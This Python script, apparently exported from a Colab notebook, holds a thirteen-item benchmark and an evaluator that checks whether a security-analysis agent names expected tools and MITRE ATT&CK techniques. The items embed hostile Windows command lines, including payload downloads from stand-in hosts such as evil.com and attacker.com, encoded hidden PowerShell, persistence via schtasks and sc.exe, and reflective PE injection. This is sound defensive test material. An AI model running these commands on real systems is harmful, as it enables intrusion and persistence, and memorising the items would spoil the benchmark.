# -*- coding: utf-8 -*-
"""eval.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1PnJUXSIHm3hy80Nr0sSj6fPf6MsmbVfV
"""

import time
from typing import List, Dict

BENCHMARK_SCENARIOS = [
    {
        "id": "T1",
        "category": "Single-Step",
        "difficulty": "Easy",
        "query": "What MITRE technique does 'powershell.exe -enc' represent?",
        "expected_tools": ["command_intel"],
        "expected_techniques": ["T1059.001"]
    },
    {
        "id": "T2",
        "category": "Single-Step",
        "difficulty": "Medium",
        "query": "Analyze: certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1105"]
    },
    {
        "id": "T3",
        "category": "Multi-Hop",
        "difficulty": "Hard",
        "query": """Analyze this chain:
        10:00:00 mshta.exe http://attacker.com/payload.hta
        10:00:15 powershell.exe -nop -w hidden -enc BASE64...
        10:00:30 schtasks.exe /create /tn "Update" /tr "malware.exe" /sc onlogon""",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1218.005", "T1059.001", "T1053.005"]
    },
    {
        "id": "T4",
        "category": "Risk Assessment",
        "difficulty": "Medium",
        "query": "Should we escalate? rundll32.exe javascript:alert('test')",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1218.011"]
    },
    {
        "id": "T5",
        "category": "Edge Case",
        "difficulty": "Easy",
        "query": "Is 'notepad.exe document.txt' malicious?",
        "expected_tools": [],
        "expected_techniques": []
    },
    {
        "id": "T6",
        "category": "Single-Step",
        "difficulty": "Easy",
        "query": "Analyze this command: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA==",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1564", "T1059"]
    },
    {
        "id": "T7",
        "category": "Multi-Hop",
        "difficulty": "Hard",
        "query": """Analyze this log sequence and determine if these commands are part of an attack chain:
        10:23:45 powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
        10:23:50 certutil.exe -urlcache -split -f http://malicious.com/payload.dll c:\\temp\\payload.dll
        10:23:55 rundll32.exe c:\\temp\\payload.dll,EntryPoint
        Are these related? What's the complete attack narrative?""",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1564", "T1059", "T1105", "T1218.011"]
    },
    {
        "id": "T8",
        "category": "Risk Assessment",
        "difficulty": "Medium",
        "query": "I found this suspicious activity in our logs: wmic process call create \"powershell.exe -enc JABXAGMAIAA9ACA...\" Should we escalate this to Incident Response? What's the risk level?",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1047", "T1059"]
    },
    {
        "id": "T9",
        "category": "Single-Step",
        "difficulty": "Medium",
        "query": "Analyze this command: regsvr32.exe /s /u /i:http://attacker.com/sc.sct scrobj.dll",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1218.010"]
    },
    {
        "id": "T10",
        "category": "Persistence",
        "difficulty": "Medium",
        "query": "What is the risk of: schtasks.exe /create /tn 'Backup' /tr 'C:\\Windows\\Temp\\payload.exe' /sc onlogon",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1053.005"]
    },
    {
        "id": "T11",
        "category": "Stealth Download",
        "difficulty": "Medium",
        "query": "Analyze usage of bitsadmin.exe /transfer myDownloadJob /download /priority foreground http://evil.com/file.exe C:\\temp\\file.exe",
        "expected_tools": ["command_intel"],
        "expected_techniques": ["T1197"]
    },
    {
        "id": "T12",
        "category": "Multi-Hop",
        "difficulty": "Hard",
        "query": """Analyze the sequence:
        1. mshta.exe http://webserver/start.hta
        2. sc.exe create MaliciousService binPath= "C:\\temp\\malware.exe" start= auto
        Is this an attack chain?""",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1218.005", "T1543.003"]
    },
    {
        "id": "T13",
        "category": "Advanced Execution",
        "difficulty": "Hard",
        "query": "Review this PowerShell script snippet: Invoke-ReflectivePEInjection -PEPath C:\\temp\\payload.dll -ProcName explorer",
        "expected_tools": ["command_intel", "calculate_risk_score"],
        "expected_techniques": ["T1055"]
    }
]

#eval
class CyberReActEvaluator:
    def __init__(self, agent_query_func):
        self.query_func = agent_query_func
        self.results = []

    def evaluate(self):
        print(f"\n{'='*80}\nCYBERSECURITY AGENT BENCHMARK STARTING [cite: 42, 43]\n{'='*80}")

        for scenario in BENCHMARK_SCENARIOS:
            start_time = time.time()
            print(f"\n[RUNNING {scenario['id']}] Category: {scenario['category']} | Difficulty: {scenario['difficulty']}")

            full_trace = self.query_func(scenario['query'])
            duration = time.time() - start_time

            used_tools = [tool for tool in scenario['expected_tools'] if f"Action: {tool}" in full_trace]
            found_techniques = [tech for tech in scenario['expected_techniques'] if tech in full_trace]

            tool_pass = len(used_tools) == len(scenario['expected_tools'])
            tech_pass = len(found_techniques) == len(scenario['expected_techniques'])
            is_passed = tool_pass and tech_pass

            self.results.append({
                "id": scenario['id'],
                "pass": is_passed,
                "duration": duration,
                "category": scenario['category']
            })

            status = " PASS" if is_passed else " FAIL"
            print(f"RESULT: {status} (Tools: {len(used_tools)}/{len(scenario['expected_tools'])}, Techs: {len(found_techniques)}/{len(scenario['expected_techniques'])})")

        self.generate_final_report()

    def generate_final_report(self):
        total = len(self.results)
        passed = sum(1 for r in self.results if r['pass'])
        pass_at_1 = (passed / total) * 100 if total > 0 else 0

        print(f"\n\n{'='*80}")
        print(f"{'FINAL BENCHMARK SUMMARY':^80}")
        print(f"{'='*80}")
        print(f"{'ID':<6} | {'Category':<20} | {'Status':<10} | {'Time (s)':<10}")
        print("-" * 80)

        for r in self.results:
            status = "PASS" if r['pass'] else "FAIL"
            print(f"{r['id']:<6} | {r['category']:<20} | {status:<10} | {r['duration']:<10.2f}")

        print("-" * 80)

        print(f"Final Model Performance (Pass@1): {pass_at_1:.1f}% [cite: 83, 84]")
        print(f"Total Problems Solved: {passed}/{total}")
        print(f"{'='*80}\n")

if __name__ == "__main__":
    evaluator = CyberReActEvaluator(query)
    evaluator.evaluate()